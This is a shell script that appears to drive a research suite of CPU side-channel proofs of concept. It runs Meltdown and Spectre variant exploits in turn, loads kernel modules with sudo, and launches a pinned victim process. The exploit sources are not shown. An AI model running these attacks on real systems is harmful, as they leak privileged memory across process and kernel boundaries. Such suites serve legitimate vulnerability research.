# Get pagesize and threshold
pagesize=$(./libcache/get_pagesize)
threshold=$(./libcache/get_threshold)
printf "pagesize = $pagesize, threshold = $threshold\n\n"

# Exploit
# meltdown_ac
./meltdown/AC/poc $pagesize $threshold
# meltdown_br
./meltdown/BR/poc $pagesize $threshold
# meltdown_de
./meltdown/DE/poc $pagesize $threshold
# meltdown_gp
sudo insmod libcr3/kernel_module.ko
./meltdown/GP/poc $pagesize $threshold
sudo rmmod libcr3/kernel_module.ko
# meltdown_nm
printf "Launching victim process for Meltdown_NM...\n"
taskset 0x2 ./meltdown/NM/victim &
victimpid=$!
sleep 3
printf "Done...\n"
taskset 0x2 ./meltdown/NM/poc $pagesize $threshold
printf "Terminating victim process for Meltdown_NM...\n"
kill $victimpid >/dev/null 1>&1
sleep 1
printf "Done...\n\n"
# meltdown_p
sudo insmod libpte/module/pteditor.ko
./meltdown/P/poc $pagesize $threshold
sudo rmmod libpte/module/pteditor.ko
# meltdown_pk
./meltdown/PK/poc $pagesize $threshold
# meltdown_rw
./meltdown/RW/poc $pagesize $threshold
# meltdown_ss
./meltdown/SS/poc $pagesize $threshold
# meltdown_ud
./meltdown/UD/poc $pagesize $threshold
# meltdown_us
sudo insmod libpte/module/pteditor.ko
./meltdown/US/poc $pagesize $threshold
sudo rmmod libpte/module/pteditor.ko

# spectre_btb
# spectre_btb_ca_ip
./spectre/BTB/ca_ip/poc $pagesize $threshold
wait $!
sleep 3
# spectre_btb_ca_oop
cd spectre/BTB/ca_oop
./exploit.sh
cd ../../../
# spectre_btb_sa_ip
./spectre/BTB/sa_ip/poc $pagesize $threshold
# spectre_btb_sa_oop
./spectre/BTB/sa_oop/poc $pagesize $threshold

# spectre_pht
# spectre_pht_ca_ip
./spectre/PHT/ca_ip/poc $pagesize $threshold
# spectre_pht_ca_oop
./spectre/PHT/ca_oop/poc $pagesize $threshold
# spectre_pht_sa_ip
./spectre/PHT/sa_ip/poc $pagesize $threshold
# spectre_pht_sa_oop
./spectre/PHT/sa_oop/poc $pagesize $threshold

# spectre_rsb
# spectre_rsb_ca_ip
./spectre/RSB/ca_ip/poc $pagesize $threshold
# spectre_rsb_ca_oop
./spectre/RSB/ca_oop/poc $pagesize $threshold
# spectre_rsb_sa_ip
./spectre/RSB/sa_ip/poc $pagesize $threshold
# spectre_rsb_sa_oop
./spectre/RSB/sa_oop/poc $pagesize $threshold

# spectre_stl
./spectre/STL/poc $pagesize $threshold